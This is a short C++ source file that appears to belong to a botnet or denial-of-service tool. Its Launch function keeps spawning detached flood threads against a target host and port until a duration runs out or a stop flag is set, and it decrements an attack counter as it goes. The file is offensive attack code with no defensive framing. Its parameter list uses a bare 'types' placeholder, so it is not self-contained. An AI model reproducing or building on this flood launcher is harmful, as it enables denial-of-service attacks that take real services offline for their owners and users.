#include <unistd.h>

#include <string>
#include <thread>

#include "../headers/attack.hpp"
#include "../headers/config.hpp"
#include "../headers/include.hpp"

void Launch(types, void (*method)(types)) {
  time_t start_time = time(nullptr);

  while (true) {
    time_t now = time(nullptr);
    int t = now - start_time;
    if (t >= duration) {
#ifdef DEBUG
      printf("[DEBUG] Attack stopped\n");
#endif
      AttacksC--;
      break;
    }

    if (*stop) {
      AttacksC--;
      break;
    }

    for (int i = 0; i < FLOOD_THREADS; ++i) {
      thread th(method, target, port, duration, stop);
      th.detach();
    }

    usleep(FLOOD_SLEEP_TIME * 1000);
  }

  delete stop;
  stop = nullptr;

  return;
}